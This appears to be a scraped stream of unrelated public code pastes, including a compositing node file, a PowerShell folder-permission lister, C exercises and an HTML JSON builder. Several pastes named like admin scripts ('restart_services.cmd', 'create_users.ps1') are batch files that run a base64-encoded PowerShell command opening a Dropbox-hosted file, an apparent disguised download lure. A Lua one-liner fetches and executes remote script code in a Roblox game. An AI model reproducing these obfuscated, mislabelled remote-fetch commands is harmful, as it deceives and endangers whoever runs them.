							{ X = -0.35072797995612, Y = 0.00382766693571225, LX = 0.00532632909608133, LY = 0.000959431168254616, RX = -0.00150334779162492, RY = -0.000270797898889285 },
							{ X = -0.355167454873111, Y = 0.00269120874332367, LX = 0.0014516081188279, LY = 0.00047562585503659, RX = -0.00132715861937303, RY = -0.000434849423147457 },
							{ X = -0.358525176320147, Y = 0.000185275208649175, LX = 0.000215211698503646, LY = 0.0013799014264124, RX = -0.000179958441339911, RY = -0.00115386343598645 },
							{ X = -0.355924376318404, Y = -0.00216204500311892, LX = -0.00107296401148276, LY = 0.000461014207567146, RX = 0.00155337917336708, RY = -0.000667431396577313 },
							{ X = -0.351144666934613, Y = -0.00385923147931767, LX = -0.00164972341449385, LY = 0.000369951592858465, RX = 0.00565280429687301, RY = -0.00126764519153471 },
							{ X = -0.334021415033079, Y = -0.00683317348782047, LX = -0.00574913376907097, LY = 0.000713149111823613, RX = 0.0107639318966872, RY = -0.00133520783829192 },
							{ X = -0.30165040429595, Y = -0.0101381322603705, LX = -0.0108078819244976, LY = 0.000913618166453561, RX = 0.0172163052609757, RY = -0.00145533873847984 },
							{ X = -0.249941993875596, Y = -0.0137315833795062, LX = -0.0172361368067846, LY = 0.0011978170397119, RX = 0.0223760885108223, RY = -0.00155501551193388 },
							{ X = -0.182708113580449, Y = -0.016457954632791, LX = -0.0224112934317157, LY = 0.00090879041776159, RX = 0.00230655030495224, RY = -0.0122233694579844 },
							{ X = -0.175788462665592, Y = -0.0531280630067441, LX = -0.00292458545608695, LY = 0.012090398468442, RX = 0.00296790185830926, RY = -0.0122694708774896 },
							{ X = -0.161743465721649, Y = -0.0882972721865323, LX = -0.00646024315224589, LY = 0.0108449811188393, RX = 0.00972963383649355, RY = -0.0163333937691354 },
							{ X = -0.126590114033191, Y = -0.133211096389737, LX = -0.0133549848470347, LY = 0.0135310718845678, RX = 0.0102992900145919, RY = -0.0104350873582906 },
							{ X = -0.0914588863475341, Y = -0.159677955820297, LX = -0.0127282439411281, LY = 0.00727724049038938, RX = 0.0138775637380248, RY = -0.00793435207632913 },
							{ X = -0.0471456738093963, Y = -0.178013867527017, LX = -0.0154923231983584, LY = 0.00394063955363802, RX = 0.0153269659465464, RY = -0.00389857915258465 },
							{ X = -1.28391878794236e-08, Y = -0.183335511305231, LX = -0.0157457167360524, LY = -5.34682970461942e-06, RX = -3.77839960157788e-07, RY = 0.0129630713701404 },
							{ Linear = true, X = -1.14635906835279e-06, Y = -0.144446297194809, LX = 3.77839960157788e-07, LY = -0.0129630713701404, RX = -0.014128254109285, RY = 3.74185475627551e-05 },
							{ X = -0.0412269180402034, Y = -0.138920669930164, LX = 0.0133380592702736, LY = -0.00378538683619716, RX = -0.0118664014796268, RY = 0.00336772532223785 },
							{ X = -0.0749630029853052, Y = -0.123713628999317, LX = 0.0104606042167561, LY = -0.00653672833626382, RX = -0.0092478172335246, RY = 0.00577886971979475 },
							{ X = -0.100473249461455, Y = -0.103232309360842, LX = 0.00786324014125579, LY = -0.00755558821694109, RX = -0.00809653422865011, RY = 0.007779754594431 },
							{ X = -0.122013717248223, Y = -0.0773341573010005, LX = 0.00580481874297385, LY = -0.00961158298234441, RX = -0.00679175732399015, RY = 0.0112457497823668 },
							{ X = -0.137902553473606, Y = -0.0412661855692388, LX = 0.00413790362587143, LY = -0.0124688655979033, RX = -0.00256807646696938, RY = 0.00773845966628477 },
							{ X = -0.142296778278065, Y = -0.0172037717025848, LX = 0.000330656879090146, LY = -0.0091413635753067, RX = 0.0473154095507457, RY = -0.000866692673993386 },
							{ X = -0.00033589204486693, Y = -0.0189300465133703, LX = -0.0473237188163049, LY = -8.55596798421667e-05, RX = 0.0476790073880519, RY = 0.00070493717416253 },
							{ Linear = true, X = 0.142701130119289, Y = -0.0168152349908827, LX = -0.0476790073880519, LY = -0.00070493717416253, RX = -0.000434884483059016, RY = -0.00695838185462612 },
							{ X = 0.139646567811198, Y = -0.0376903805547611, LX = 0.00140035953175601, LY = 0.00689164544006, RX = -0.00174130433930096, RY = -0.00856955077433002 },
							{ X = 0.130658428149921, Y = -0.0623366260479874, LX = 0.00393705681665301, LY = 0.00780826004295032, RX = -0.00396672376358087, RY = -0.00786709770953246 },
							{ X = 0.117036465379612, Y = -0.0849878345008556, LX = 0.0049994942605068, LY = 0.00725473506939072, RX = -0.00493418585161644, RY = -0.0071599664428827 },
							{ X = 0.100184426792375, Y = -0.104900407935442, LX = 0.00620348516178722, LY = 0.0060932816551497, RX = -0.00599992790088439, RY = -0.00589334054280981 },
							{ X = 0.0803753769549538, Y = -0.120526569417475, LX = 0.00700503836288775, LY = 0.00465403428262059, RX = -0.00706450810908055, RY = -0.00469354502092381 },
							{ X = 0.0582360971335459, Y = -0.133067783320831, LX = 0.007717567338295, LY = 0.00351792468162491, RX = -0.00834484953817213, RY = -0.00380386083696519 },
							{ X = 0.032016327810221, Y = -0.141403041947124, LX = 0.0089973907936984, LY = 0.00177562101451872, RX = -0.0105215764164588, RY = -0.0020764166655975 },
							{ X = -1.29764788755482e-05, Y = -0.144445948640423, LX = 0.0109606870017038, LY = -7.26360686688236e-05, RX = 4.47129233546728e-06, RY = -0.0129606162652199 },
							{ Linear = true, X = 4.37398130853637e-07, Y = -0.183327797436083, LX = -4.47129233546728e-06, LY = 0.0129606162652199, RX = 0.0146179667056262, RY = -2.56225638436744e-06 },
							{ X = 0.0441992611685316, Y = -0.17806525389291, LX = -0.01444779582279, LY = -0.0033760784284839, RX = 0.013114418308875, RY = 0.00306450238484593 },
							{ X = 0.0822094859730252, Y = -0.164367257968915, LX = -0.0121081386003815, LY = -0.00589678913314976, RX = 0.00977392848404656, RY = 0.0047600045865921 },
							{ X = 0.110029645620355, Y = -0.147345959185397, LX = -0.00882901134683038, LY = -0.00634317588540432, RX = 0.00836192283802341, RY = 0.00600759759141135 },
							{ X = 0.133561777037549, Y = -0.12733707035347, LX = -0.00707907127010807, LY = -0.00747661235601522, RX = 0.00660959272996294, RY = 0.00698076919803562 },
							{ X = 0.151088903559108, Y = -0.104433783956814, LX = -0.0053301109192621, LY = -0.00800048575028946, RX = 0.00631145454466097, RY = 0.00947348055472554 },
							{ X = 0.168263350909996, Y = -0.0749165010736903, LX = -0.00485231716959199, LY = -0.0102973933777324, RX = 0.00459520812044331, RY = 0.00975176683941581 },
							{ X = 0.178548209330571, Y = -0.0442548355169501, LX = -0.00222497562137315, LY = -0.0105480982951816, RX = 0.00198475698414305, RY = 0.00940927691956856 },
							{ X = 0.182863247135595, Y = -0.0157303859927562, LX = -0.000855042982036924, LY = -0.00950814984139796, RX = 0.00470162521224566, RY = 0.000142664757171502 },
							{ X = 0.196959285635382, Y = -0.015072575478245, LX = -0.00470121112077692, LY = -0.000155867664683622, RX = 0.0177636857536004, RY = 0.000588951260314779 },
							{ X = 0.250245088481239, Y = -0.0131837959279409, LX = -0.0177539461070558, LY = -0.000821495661474832, RX = 0.0190529340940652, RY = 0.000881601341034829 },
							{ X = 0.30737125144212, Y = -0.0099088650855236, LX = -0.0190420543202937, LY = -0.00109164361413911, RX = 0.00940159985993338, RY = 0.000538975274261752 },
							{ X = 0.33538934401793, Y = -0.00628786289463565, LX = -0.0093001278700775, LY = -0.00147925517500282, RX = 0.00440212111034509, RY = 0.000700190419361713 },
							{ X = 0.348590392262914, Y = -0.00415414377647208, LX = -0.00439161593752982, LY = -0.000763312747663704, RX = 0.00188733058197368, RY = 0.000328039499074773 },
							{ X = 0.354134900524466, Y = -0.00264249967648254, LX = -0.0018446463644694, LY = -0.00051662987588424, RX = 0.0015822631226828, RY = 0.000443144234273304 },
							{ X = 0.358282646491758, Y = 2.12578212558385e-05, LX = 7.07484418630148e-05, LY = -0.00164162360477229, RX = -7.38432967406165e-05, RY = 0.00171343560072059 },
							{ X = 0.353903688358534, Y = 0.00272247147072548, LX = 0.00165868464402906, LY = -0.000435981240367601, RX = -0.00187205345797521, RY = 0.000492064716207857 },
							{ X = 0.34830188318326, Y = 0.00425223788699659, LX = 0.0018825511396518, LY = -0.000450236650051256, RX = -0.00425511896308136, RY = 0.00101766717894404 },
							{ X = 0.335413914359891, Y = 0.00673727601578835, LX = 0.00433175473941563, LY = -0.000614479254836782, RX = -0.00939265166711982, RY = 0.00133239066949849 },
							{ X = 0.307120437274919, Y = 0.00981196080716248, LX = 0.00946463011412979, LY = -0.000646488235564207, RX = -0.0190240857754257, RY = 0.00129945359701021 }
						}
					},
				},
				Polyline2 = Input {
					Value = Polyline {
					},
					Disabled = true,
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5005, 313.5 } },
		},
		Ellipse1_3_1_2_1 = EllipseMask {
			Inputs = {
				Level = Input { Value = 0.346, },
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				PaintMode = Input { Value = FuID { ""Maximum"" }, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input { Value = { 0.5, 0.4922 }, },
				Width = Input { Value = 0.812, },
				Height = Input { Value = 0.0545208, }
			},
			ViewInfo = OperatorInfo { Pos = { 5005, 280.5 } },
		},
		Merge7 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Background4_1_1_1_1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Paint1"",
					Source = ""Output"",
				},
				PerformDepthMerge = Input { Value = 0, }
			},
			ViewInfo = OperatorInfo { Pos = { 5170, 643.5 } },
		},
		Background4_1_1_1_1 = Background {
			Inputs = {
				GlobalOut = Input { Value = 99, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 1080, },
				UseFrameFormatSettings = Input { Value = 1, },
				Depth = Input { Value = 2, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				Type = Input { Value = FuID { ""Gradient"" }, },
				TopLeftRed = Input { Value = 0.933333337306976, },
				TopLeftGreen = Input { Value = 0.776470601558685, },
				TopLeftBlue = Input { Value = 0.61176472902298, },
				GradientType = Input { Value = FuID { ""Radial"" }, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0.6618497109827] = { 0.307, 0.234218536585362, 0.157798, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				}
			},
			ViewInfo = OperatorInfo { Pos = { 5060, 643.5 } },
		}
	}
}"
FtRCAQzU,Folder Group Permissions with exceptions,joedigital,PowerShell,Friday 9th of May 2025 10:01:38 AM CDT,"<#
.SYNOPSIS
    Lists groups and users with permissions on folders, excluding specified default identities.
.DESCRIPTION
    This script recursively scans a specified folder path, identifies all security principals (users or groups)
    that have permissions, and lists those whose names are not in a predefined exclusion list.
    The exclusion list targets common administrative, system, and broad access accounts.
.PARAMETER Path
    The root folder path to scan for permissions. This parameter is mandatory.
.EXAMPLE
    .\Get-FolderPermissionsExcludingDefaults.ps1 -Path ""C:\Shares\DepartmentX""

    This command will scan the ""C:\Shares\DepartmentX"" folder and its subfolders,
    displaying security principals (groups or users) with their permissions,
    excluding the predefined system/admin/common groups.
.EXAMPLE
    Get-ChildItem -Path ""C:\Projects"" -Directory | .\Get-FolderPermissionsExcludingDefaults.ps1

    This command gets all subdirectories of ""C:\Projects"" and pipes them to the script
    to analyze permissions for each.
.OUTPUTS
    PSCustomObject
    Outputs objects with the following properties:
    - FolderPath: The full path to the folder.
    - Identity: The security principal (e.g., ""DOMAIN\GroupName"" or ""BUILTIN\Users"").
    - Permissions: The file system rights granted to the security principal (e.g., ""ReadAndExecute, Synchronize"").
    - AccessControlType: Specifies whether the rights are ""Allow"" or ""Deny"".
    - IsInherited: Indicates if the permission is inherited from a parent folder (True/False).
.NOTES
    Author: Gemini
    Date: 2025-05-09
    The script filters identities based on the name part of the IdentityReference (e.g., ""GroupName"" from ""DOMAIN\GroupName"").
    The exclusion list matching is case-insensitive.
    If you need to exclude ""Backup Operators"" (the built-in group), ensure ""Backup Operators"" is in the $ExcludedIdentities list.
    The script requires appropriate permissions to read ACLs of the target folders.
#>
[CmdletBinding()]
param (
    [Parameter(Mandatory = $true, ValueFromPipeline = $true, Position = 0)]
    [string]$Path
)

begin {
    # List of identity names to exclude (case-insensitive matching will be used)
    # These are the ""name parts"" after any domain or ""BUILTIN\"" prefix.
    $Global:ExcludedIdentities = @(
        ""Domain Admins"",
        ""Backup_OPs"",      # This is per user request. The built-in group is ""Backup Operators"".
                           # Add ""Backup Operators"" to this list if you want to exclude the built-in group.
        ""Administrators"",  # Matches BUILTIN\Administrators
        ""SYSTEM"",          # Matches NT AUTHORITY\SYSTEM
        ""Domain Users"",
        ""CREATOR OWNER"",   # Matches special identity
        ""Authenticated Users"", # Matches well-known group
        ""Users""            # Matches BUILTIN\Users
    )

    Write-Verbose ""Script initialized. Excluded identities (case-insensitive): $($Global:ExcludedIdentities -join ', ')""
    $Global:Results = [System.Collections.Generic.List[PSCustomObject]]::new()
}

process {
    # Validate the path
    if (-not (Test-Path -Path $Path -PathType Container)) {
        Write-Error ""The path '$Path' does not exist or is not a folder. Please provide a valid folder path. Skipping this item.""
        return # Changed from 'continue' to 'return' as process block handles one item from pipeline
    }

    Write-Verbose ""Starting permission scan for base folder: $Path""

    # Create a list of folders to process: the root path itself and all its subdirectories
    $FoldersToProcess = [System.Collections.Generic.List[System.IO.DirectoryInfo]]::new()
    try {
        $RootFolderItem = Get-Item -Path $Path -ErrorAction Stop
        $FoldersToProcess.Add($RootFolderItem)

        $SubFolders = Get-ChildItem -Path $Path -Directory -Recurse -ErrorAction SilentlyContinue # Continue if some subfolders are inaccessible
        if ($null -ne $SubFolders) {
            $FoldersToProcess.AddRange($SubFolders)
        }
    }
    catch {
        Write-Error ""Error accessing folder structure for '$Path': $($_.Exception.Message)""
        return
    }

    foreach ($Folder in $FoldersToProcess) {
        Write-Verbose ""Processing folder: $($Folder.FullName)""
        try {
            # Get-Acl can be slow; ensure errors don't stop the whole script for one folder.
            $Acl = Get-Acl -Path $Folder.FullName -ErrorAction SilentlyContinue
            if (-not $Acl) {
                Write-Warning ""Could not retrieve ACL for $($Folder.FullName). Skipping.""
                continue
            }

            foreach ($Ace in $Acl.Access) {
                $IdentityName = $Ace.IdentityReference.Value
                # Extract the name part, e.g., ""Administrators"" from ""BUILTIN\Administrators"" or ""SalesUsers"" from ""CONTOSO\SalesUsers""
                $IdentityNamePart = $IdentityName.Split('\')[-1]

                # Check if the identity name part is in the exclusion list (PowerShell -eq is case-insensitive for strings)
                $IsExcluded = $false
                foreach ($ExcludedItem in $Global:ExcludedIdentities) {
                    if ($IdentityNamePart -eq $ExcludedItem) {
                        $IsExcluded = $true
                        Write-Verbose ""Excluding '$IdentityName' because '$IdentityNamePart' is in the exclusion list.""
                        break
                    }
                }

                if (-not $IsExcluded) {
                    $OutputObject = [PSCustomObject]@{
                        FolderPath        = $Folder.FullName
                        Identity          = $IdentityName
                        Permissions       = $Ace.FileSystemRights.ToString() # Convert FileSystemRights enum to string
                        AccessControlType = $Ace.AccessControlType.ToString()
                        IsInherited       = $Ace.IsInherited
                    }
                    $Global:Results.Add($OutputObject)
                }
            }
        }
        catch {
            # Catch errors specific to processing a single folder's ACL
            Write-Warning ""Error processing ACL for folder '$($Folder.FullName)': $($_.Exception.Message)""
        }
    }
}

end {
    if ($Global:Results.Count -eq 0) {
        Write-Host ""No non-excluded identities with permissions found in the processed path(s).""
    } else {
        Write-Output $Global:Results
    }
    Write-Verbose ""Script finished. Total matching ACEs found: $($Global:Results.Count)""
}
"
TuizAf14,restart_services.cmd,ccmoi,Batch,Friday 9th of May 2025 10:01:14 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBmADAAYgA5AGIAOQA4ADgA
EXIT /b
"
TTevBB7C,Untitled,dllbridge,C,Friday 9th of May 2025 09:56:21 AM CDT,"


#include   <stdio.h>

char sz[14][99] {""       "",
                 ""January"",
                 ""February""};
 
/////////////////////////////////////////////////////////////
int main()
{
     
	for(int i = 1; i <= 2; i++)
	{ 	
        printf(""%s\n"", sz[i]); 	     	
	}
 	
     	
     	
}




   //printf(""%s\n"", sz[2]); 



















/*


#include   <stdio.h>


 
/////////////////////////////////////////////////////////////
int main()
{
     	
    int n = 5;
	
	

		if(n == 1) 
		{  
			printf(""January\n"");  
		}
		else 
		{        
            if(n == 7) printf(   ""July\n"");
            else 
            if(n == 5) printf(    ""May\n"");
            else
            {
			           printf(""Error !\n""); 
			}
	    }
		        	
}

*/

/*


#include   <stdio.h>


 
/////////////////////////////////////////////////////////////
int main()
{
     	
    int n = 5;
	
	

		if(n == 1) 
		{  
			printf(""January\n"");  
		}
		else 
		{        
            if(n == 7) printf(   ""July\n"");
            else 
            if(n == 5) printf(    ""May\n"");
            else
            {
			           printf(""Error !\n""); 
			}
	    }
		        	
}


*/

/*

#include   <stdio.h>


 
/////////////////////////////////////////////////////////////
int main()
{
     	
    int n = 5;
	
	

		if(n == 1) {  printf(""January\n"");  }
		else {        
          if(n == 7) printf(   ""July\n"");
          else printf(""Error !\n""); 
	    }
		        	
}

*/







/*
#include   <stdio.h>


 
/////////////////////////////////////////////////////////////
int main()
{
     	
    int n = 1;
	
	
	switch(n)
	{
		
		case  1: printf(""January\n"");
		         break;

		case  7: printf(   ""July\n"");
		         break;
		         
		default: printf(""Error !\n"");         
	}
	 	
}

*/









/*

#include   <stdio.h>

int foo();
 
/////////////////////////////////////////////////////////////
int main()
{

    char sz[99] = ""SONY"";
			 	
    printf(""foo = %d\n"", foo ); 	
    printf(""sz  = %d\n"",  sz );   
    
    char *p = sz;
    
    printf(""sz = %s\n"",  p);
    printf("" S = %c\n"", *p);
}


////////////////////////////////////////////////////////////
int foo()
{
	
return 14;	
}

*/



/*

#include   <stdio.h>

int foo();
 
/////////////////////////////////////////////////////////////
int main()
{
	
    int n = 81;
    
    n = foo();
			 	
    printf(""foo = %d"", n); 	
  
return 0;
}


////////////////////////////////////////////////////////////
int foo()
{
	
return 1111;	
}
*/

"
NnnLCSxd,# rgb_to_int.py,here2share,Python,Friday 9th of May 2025 09:54:47 AM CDT,"# rgb_to_int.py

def rgb_to_int(r, g, b):
    return (r * 256 * 256) + (g * 256) + b

r, g, b = 255, 0, 0
number = rgb_to_int(r, g, b)
print(number)  # Outputs 16,711,680"
MMi6J0NC,create_users.ps1,ccmoi,Batch,Friday 9th of May 2025 09:51:12 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBlAGMAMgA0AGMAZAAxADAA
EXIT /b
"
TR7wF3JM,BGSI Script,DatReaperCat,Lua,Friday 9th of May 2025 09:50:46 AM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/CodeCrackerXGaming/NoxScripts/refs/heads/main/BGSIScript""))()"
PuQv9aJv,JSON Builder Tools,willysec_id,HTML,Friday 9th of May 2025 09:47:42 AM CDT,"<!DOCTYPE html>
<html lang=""en"">
<head>
  <meta charset=""UTF-8"">
  <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
  <title>JSON Builder Tool</title>
  <link href=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"" rel=""stylesheet"">
  <style>
    textarea {
      font-family: monospace;
    }
  </style>
</head>
<body class=""p-4"">
  <div class=""container"">
    <h2>JSON Builder Tool</h2>
    <button class=""btn btn-primary me-2"" data-bs-toggle=""modal"" data-bs-target=""#inputModal"">Input JSON</button>
    <button class=""btn btn-success"" onclick=""showGeneratedModal()"">Generate JSON</button>

    <!-- CRUD Table -->
    <div class=""mt-4"">
      <h4>Data Entries</h4>
      <button class=""btn btn-outline-primary mb-2"" onclick=""showAddEntryModal()"">Add New Entry</button>
      <table class=""table table-bordered"">
        <thead>
          <tr>
            <th>Slug</th>
            <th>Title</th>
            <th>Description</th>
            <th>Keyword</th>
            <th>adsData</th>
            <th>Actions</th>
          </tr>
        </thead>
        <tbody id=""dataTable""></tbody>
      </table>
    </div>
  </div>

  <!-- Input Modal -->
  <div class=""modal fade"" id=""inputModal"" tabindex=""-1"">
    <div class=""modal-dialog modal-lg"">
      <div class=""modal-content"">
        <div class=""modal-header"">
          <h5 class=""modal-title"">Input JSON</h5>
          <button type=""button"" class=""btn-close"" data-bs-dismiss=""modal""></button>
        </div>
        <div class=""modal-body"">
          <div class=""mb-3"">
            <label for=""jsonPaste"" class=""form-label"">Paste JSON:</label>
            <textarea id=""jsonPaste"" class=""form-control"" rows=""5""></textarea>
          </div>
          <div class=""mb-3"">
            <label for=""jsonFile"" class=""form-label"">Upload JSON File:</label>
            <input type=""file"" id=""jsonFile"" accept=""application/json"" class=""form-control"">
          </div>
        </div>
        <div class=""modal-footer"">
          <button class=""btn btn-secondary"" data-bs-dismiss=""modal"">Close</button>
          <button class=""btn btn-primary"" onclick=""loadFromPaste(); document.getElementById('inputModalClose').click();"">Load</button>
          <button id=""inputModalClose"" type=""button"" class=""d-none"" data-bs-dismiss=""modal""></button>
        </div>
      </div>
    </div>
  </div>

  <!-- Generate Modal -->
  <div class=""modal fade"" id=""generateModal"" tabindex=""-1"">
    <div class=""modal-dialog modal-lg"">
      <div class=""modal-content"">
        <div class=""modal-header"">
          <h5 class=""modal-title"">Generated JSON</h5>
          <button type=""button"" class=""btn-close"" data-bs-dismiss=""modal""></button>
        </div>
        <div class=""modal-body"">
          <textarea id=""generatedJson"" class=""form-control"" rows=""10"" disabled></textarea>
        </div>
        <div class=""modal-footer"">
          <button class=""btn btn-secondary"" data-bs-dismiss=""modal"">Close</button>
          <button class=""btn btn-info"" onclick=""copyJson()"">Copy</button>
          <button class=""btn btn-success"" onclick=""downloadJson()"">Download</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Add/Edit Entry Modal -->
  <div class=""modal fade"" id=""addEntryModal"" tabindex=""-1"">
    <div class=""modal-dialog"">
      <div class=""modal-content"">
        <div class=""modal-header"">
          <h5 class=""modal-title"" id=""entryModalTitle"">Add New Entry</h5>
          <button type=""button"" class=""btn-close"" data-bs-dismiss=""modal""></button>
        </div>
        <div class=""modal-body"">
          <input id=""slug"" class=""form-control mb-2"" placeholder=""Slug"">
          <input id=""title"" class=""form-control mb-2"" placeholder=""Title"">
          <textarea id=""description"" class=""form-control mb-2"" placeholder=""Description""></textarea>
          <input id=""keyword"" class=""form-control mb-2"" placeholder=""Keyword"">
          <input id=""adsData"" class=""form-control"" placeholder=""adsData URL"">
        </div>
        <div class=""modal-footer"">
          <button class=""btn btn-secondary"" data-bs-dismiss=""modal"">Cancel</button>
          <button class=""btn btn-primary"" id=""entryModalBtn"" onclick=""addEntry()"">Add</button>
        </div>
      </div>
    </div>
  </div>

  <script src=""https://code.jquery.com/jquery-3.6.0.min.js""></script>
  <script src=""https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js""></script>
  <script>
    let jsonData = { data: [] };
    let editingIndex = null;

    function slugify(text) {
      return text.toString().toLowerCase()
        .replace(/\s+/g, '-')
        .replace(/[^a-z0-9\-]/g, '')
        .replace(/\-+/g, '-')
        .replace(/^-+|-+$/g, '');
    }

    function isValidURL(url) {
      try {
        new URL(url);
        return true;
      } catch (_) {
        return false;
      }
    }

    function loadFromPaste() {
      const text = $('#jsonPaste').val();
      try {
        const loaded = JSON.parse(text);
        if (loaded.data && Array.isArray(loaded.data)) {
          jsonData = loaded;
          alert('JSON loaded successfully!');
          renderTable();
        } else {
          alert('Invalid JSON format');
        }
      } catch (err) {
        alert('Error parsing pasted JSON: ' + err);
      }
    }

    $('#jsonFile').on('change', function(e) {
      const file = e.target.files[0];
      if (!file) return;

      const reader = new FileReader();
      reader.onload = function(evt) {
        try {
          const loaded = JSON.parse(evt.target.result);
          if (loaded.data && Array.isArray(loaded.data)) {
            jsonData = loaded;
            alert('File loaded successfully!');
            renderTable();
          } else {
            alert('Invalid JSON format');
          }
        } catch (err) {
          alert('Error reading JSON: ' + err);
        }
      };
      reader.readAsText(file);
    });

    function showGeneratedModal() {
      $('#generatedJson').val(JSON.stringify(jsonData, null, 2));
      new bootstrap.Modal(document.getElementById('generateModal')).show();
    }

    function downloadJson() {
      const blob = new Blob([JSON.stringify(jsonData, null, 2)], { type: 'application/json' });
      const url = URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = 'data.json';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }

    function copyJson() {
      navigator.clipboard.writeText(JSON.stringify(jsonData, null, 2))
        .then(() => alert('JSON copied to clipboard'))
        .catch(err => alert('Failed to copy: ' + err));
    }

    function renderTable() {
      const tbody = $('#dataTable');
      tbody.empty();
      jsonData.data.forEach((item, index) => {
        tbody.append(`
          <tr>
            <td>${item.slug}</td>
            <td>${item.meta.title}</td>
            <td>${item.meta.description}</td>
            <td>${item.meta.keyword}</td>
            <td>${item.adsData}</td>
            <td>
              <button class=""btn btn-sm btn-warning me-1"" onclick=""showEditEntryModal(${index})"">Edit</button>
              <button class=""btn btn-sm btn-danger"" onclick=""deleteEntry(${index})"">Delete</button>
            </td>
          </tr>
        `);
      });
    }

    function showAddEntryModal() {
      editingIndex = null;
      $('#entryModalTitle').text('Add New Entry');
      $('#entryModalBtn').text('Add').attr('onclick', 'addEntry()');
      $('#slug').val('');
      $('#title').val('');
      $('#description').val('');
      $('#keyword').val('');
      $('#adsData').val('');
      new bootstrap.Modal(document.getElementById('addEntryModal')).show();
    }

    function addEntry() {
      const slug = slugify($('#slug').val());
      const ads = $('#adsData').val();
      if (!isValidURL(ads)) {
        alert('Invalid adsData URL');
        return;
      }
      const newEntry = {
        slug,
        meta: {
          title: $('#title').val(),
          description: $('#description').val(),
          keyword: $('#keyword').val(),
        },
        adsData: ads,
      };
      jsonData.data.push(newEntry);
      renderTable();
      bootstrap.Modal.getInstance(document.getElementById('addEntryModal')).hide();
    }

    function showEditEntryModal(index) {
      editingIndex = index;
      const entry = jsonData.data[index];
      $('#entryModalTitle').text('Edit Entry');
      $('#entryModalBtn').text('Update').attr('onclick', 'updateEntry()');
      $('#slug').val(entry.slug);
      $('#title').val(entry.meta.title);
      $('#description').val(entry.meta.description);
      $('#keyword').val(entry.meta.keyword);
      $('#adsData').val(entry.adsData);
      new bootstrap.Modal(document.getElementById('addEntryModal')).show();
    }

    function updateEntry() {
      if (editingIndex !== null) {
        const slug = slugify($('#slug').val());
        const ads = $('#adsData').val();
        if (!isValidURL(ads)) {
          alert('Invalid adsData URL');
          return;
        }
        jsonData.data[editingIndex] = {
          slug,
          meta: {
            title: $('#title').val(),
            description: $('#description').val(),
            keyword: $('#keyword').val(),
          },
          adsData: ads,
        };
        renderTable();
        bootstrap.Modal.getInstance(document.getElementById('addEntryModal')).hide();
      }
    }

    function deleteEntry(index) {
      if (confirm('Are you sure you want to delete this entry?')) {
        jsonData.data.splice(index, 1);
        renderTable();
      }
    }
  </script>
</body>
</html>"
8DXmX8BY,create_users.ps1,ccmoi,Batch,Friday 9th of May 2025 09:41:11 AM CDT,"@ECHO OFF
TITLE $~foddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==tutorial GOTO tutorial

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZAByAG8AcABiAG8AeAAuAGMAbwBtAC8AcwBjAGwALwBmAGkALwBwADUANgBjAGcANQByADgAMABqAGMAeAB0AGQAeQB2AHUAegB0AGcAcQAvAHYAMQAuADgALgBwAGQAZgA/AHIAbABrAGUAeQA9AHIAZgBhAGcANQA5AGoAbgBjADYAZABoAGoAZgBnAHgAdAB2AGUAegBhAHYAYQBlAHgAJgBzAHQAPQAyAGcAcwBkADUAZAA3AGgAJgBkAGwAPQAwACIAIAAgACMAIABpAGQAPQBiAGMAMwA4ADUAMQBlADYA
EXIT /b
"
r9C3JSSp,UIAspectRatioConstraint Plugin,HowToRoblox,Lua,Friday 9th of May 2025 09:11:51 AM CDT,"local selection = game:GetService(""Selection"")

local toolbar = plugin:CreateToolbar(""UIAspectRatio"")

